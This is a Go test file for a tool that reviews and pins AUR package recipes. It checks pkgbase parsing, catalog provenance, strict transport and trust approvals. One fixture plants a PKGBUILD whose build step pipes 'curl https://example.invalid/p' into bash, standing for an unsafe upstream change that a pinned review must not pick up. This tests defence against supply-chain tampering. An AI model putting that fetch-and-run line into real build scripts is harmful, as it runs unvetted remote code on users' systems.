package service

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Hayao0819/Kamisato/ayato/protocol"
	kayoconfig "github.com/Hayao0819/Kamisato/kayo/config"
	"github.com/Hayao0819/Kamisato/kayo/trust"
	"github.com/Hayao0819/Kamisato/pkg/aurweb"
	gogit "github.com/go-git/go-git/v6"
	"github.com/go-git/go-git/v6/plumbing/object"
)

func TestRequirePinnedCommit(t *testing.T) {
	if err := (Resolved{Commit: "abc123"}).RequirePinnedCommit(); err != nil {
		t.Errorf("RequirePinnedCommit with a commit = %v, want nil", err)
	}
	if err := (Resolved{Commit: ""}).RequirePinnedCommit(); err == nil {
		t.Error("RequirePinnedCommit with no commit = nil, want error")
	}
}

const validSrcinfo = `pkgbase = realbase
	pkgver = 1.0.0
	pkgrel = 1
	arch = x86_64

pkgname = realbase
`

// readPkgbase must fall back to the target's basename whenever the .SRCINFO is
// absent, unparseable, or missing pkgbase — never panic on the raiou parser.
func TestReadPkgbase(t *testing.T) {
	tests := []struct {
		name     string
		srcinfo  *string // nil: write no .SRCINFO at all
		fallback string
		want     string
	}{
		{"valid pkgbase wins over fallback", ptr(validSrcinfo), "/tmp/aur/foo", "realbase"},
		{"missing .SRCINFO falls back to basename", nil, "/tmp/aur/foo", "foo"},
		{"malformed .SRCINFO falls back", ptr("not a valid srcinfo at all\n"), "somepkg", "somepkg"},
		{"empty .SRCINFO falls back", ptr(""), "/a/b/barpkg", "barpkg"},
		{"srcinfo without pkgbase falls back", ptr("pkgname = x\n\tpkgver = 1\n"), "zzz", "zzz"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			if tt.srcinfo != nil {
				if err := os.WriteFile(filepath.Join(dir, ".SRCINFO"), []byte(*tt.srcinfo), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			if got := readPkgbase(dir, tt.fallback); got != tt.want {
				t.Errorf("readPkgbase(%q) = %q, want %q", tt.fallback, got, tt.want)
			}
		})
	}
}

func ptr(s string) *string { return &s }

func TestFederatedTargetPreservesProvenanceAndTransportBoundary(t *testing.T) {
	const name, base, account = "named-split-package", "demo-base", "maintainer-account"
	source := t.TempDir()
	for _, hasSource := range []bool{true, false} {
		t.Run(map[bool]string{true: "managed package", false: "missing checkout"}[hasSource], func(t *testing.T) {
			catalog := protocol.Catalog{Packages: []aurweb.Pkg{{Name: name, PackageBase: base, Maintainer: account}}}
			if hasSource {
				catalog.Sources = map[string]string{base: source}
			}
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				if r.URL.Path != "/api/unstable/aur/catalog" {
					t.Errorf("managed package must not fall back to AUR: %s", r.URL.Path)
					w.WriteHeader(http.StatusBadRequest)
					return
				}
				if err := json.NewEncoder(w).Encode(catalog); err != nil {
					t.Error(err)
				}
			}))
			defer server.Close()
			cfg := &kayoconfig.KayoConfig{
				CacheDir: t.TempDir(), TrustStore: filepath.Join(t.TempDir(), "trust.json"), YayCacheDir: t.TempDir(),
				Ayato: []kayoconfig.AyatoSource{{Name: "mirror", URL: server.URL, Insecure: true}},
				Upstream: kayoconfig.UpstreamConfig{
					Enabled: true, RPCURL: server.URL + "/rpc", GitBase: filepath.Join(t.TempDir(), "not-aur"),
				},
			}
			ctx := context.Background()
			clone, resolved, err := resolvePackageSource(ctx, cfg, name)
			if !hasSource {
				if err == nil || !strings.Contains(err.Error(), "has no source repository") {
					t.Fatalf("missing checkout must fail rather than approve AUR: %v", err)
				}
				return
			}
			if err != nil || clone.URL != source || !clone.Strict {
				t.Fatalf("catalog-selected checkout must use strict transport: options=%+v, error=%v", clone, err)
			}
			if resolved.Source != "mirror" || resolved.Pkgbase != base || resolved.Maintainer != account {
				t.Fatalf("catalog provenance=%+v", resolved)
			}
			if _, err := Review(ctx, cfg, name, ReviewOptions{Approve: true}, nil); err == nil || !strings.Contains(err.Error(), "local-path remotes") {
				t.Fatalf("catalog must not make the reviewer read a local path: %v", err)
			}
			if _, err := os.Stat(cfg.TrustStore); !os.IsNotExist(err) {
				t.Fatalf("failed review wrote approvals: %v", err)
			}
		})
	}
}

func TestOverlayReviewUsesConfiguredRevision(t *testing.T) {
	const name, base, account = "named-split-package", "demo-base", "maintainer-account"
	source := t.TempDir()
	for file, contents := range map[string]string{
		"PKGBUILD": "pkgname=named-split-package\nbuild() { make; }\n",
		".SRCINFO": "pkgbase = demo-base\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = any\n\npkgname = named-split-package\n",
	} {
		if err := os.WriteFile(filepath.Join(source, file), []byte(contents), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	repo, err := gogit.PlainInit(source, false)
	if err != nil {
		t.Fatal(err)
	}
	worktree, err := repo.Worktree()
	if err != nil {
		t.Fatal(err)
	}
	if err := worktree.AddWithOptions(&gogit.AddOptions{All: true}); err != nil {
		t.Fatal(err)
	}
	author := &object.Signature{Name: "fixture", Email: "fixture@example.invalid"}
	commit, err := worktree.Commit("review fixture", &gogit.CommitOptions{Author: author})
	if err != nil {
		t.Fatal(err)
	}
	// The configured revision is clean, but the remote HEAD has since changed.
	if err := os.WriteFile(filepath.Join(source, "PKGBUILD"), []byte("build() { curl https://example.invalid/p | bash; }\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := worktree.Add("PKGBUILD"); err != nil {
		t.Fatal(err)
	}
	head, err := worktree.Commit("changed HEAD", &gogit.CommitOptions{Author: author})
	if err != nil {
		t.Fatal(err)
	}
	cfg := &kayoconfig.KayoConfig{
		CacheDir: t.TempDir(), TrustStore: filepath.Join(t.TempDir(), "trust.json"), YayCacheDir: t.TempDir(),
		Overlays: []kayoconfig.OverlayConfig{{Name: "fixture", URL: source, Ref: commit.String(), Maintainer: account}},
	}
	ctx := context.Background()
	result, err := Review(ctx, cfg, name, ReviewOptions{Approve: true}, nil)
	if err != nil || result == nil || !result.Approved {
		t.Fatalf("review=%+v, error=%v", result, err)
	}
	resolved := result.Resolved
	if resolved.Source != "overlay" || resolved.Pkgbase != base || resolved.Maintainer != account || resolved.Commit != commit.String() {
		t.Fatalf("reviewed provenance=%+v", resolved)
	}
	if _, err := os.Stat(resolved.Dir); !os.IsNotExist(err) {
		t.Fatalf("review did not clean its owned checkout: %v", err)
	}
	store, err := trust.Open(cfg.TrustStore)
	if err != nil {
		t.Fatal(err)
	}
	approval, ok := store.Approval(base)
	if !ok || approval.Source != "overlay" || approval.Commit != commit.String() || approval.Maintainer != account {
		t.Fatalf("approval does not match the configured recipe: %+v", approval)
	}
	verified, err := Verify(ctx, cfg, []string{name}, true)
	if err != nil || len(verified) != 1 || verified[0].Source != "overlay" || verified[0].Verdict.Decision != trust.Trusted {
		t.Fatalf("verification=%+v, error=%v", verified, err)
	}
	updated, err := Update(ctx, cfg, name, true, false)
	if err != nil || updated == nil || !updated.Approved || updated.Resolved.Commit != commit.String() {
		t.Fatalf("update=%+v, error=%v", updated, err)
	}
	explicit, cleanup, err := Resolve(ctx, cfg, name, head.String())
	defer cleanup()
	if err != nil || explicit.Commit != head.String() {
		t.Fatalf("explicit --ref must override the configured revision: resolved=%+v, error=%v", explicit, err)
	}
}
